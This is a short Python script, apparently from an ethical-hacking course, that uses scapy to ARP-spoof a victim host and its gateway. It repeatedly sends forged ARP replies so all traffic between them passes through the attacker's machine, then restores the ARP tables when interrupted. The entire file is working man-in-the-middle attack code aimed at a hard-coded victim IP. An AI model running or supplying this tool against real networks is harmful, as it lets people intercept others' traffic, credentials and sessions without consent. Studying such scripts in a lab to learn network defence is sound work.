# Date : October 11th 2023
# Original Author : Zaid Sabih , Zsecurity
# Edited by : Faris Mohammad 
# Revision : 1
# Note : 

# Description : This spoofs the ARP table to route all traffic between Victim and Gateway 
#               through the Attackers computer.
#               

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.23.128"
gateway_ip = "192.168.23.2"

try:
    packet_sent_count=0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_sent_count = packet_sent_count + 2
        print("\r[+] Sent " + str(packet_sent_count), end='')
        time.sleep(1)
except KeyboardInterrupt:
    print("\n [-] Detected ctrl+c ... Resetting ARP tables... PLease wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
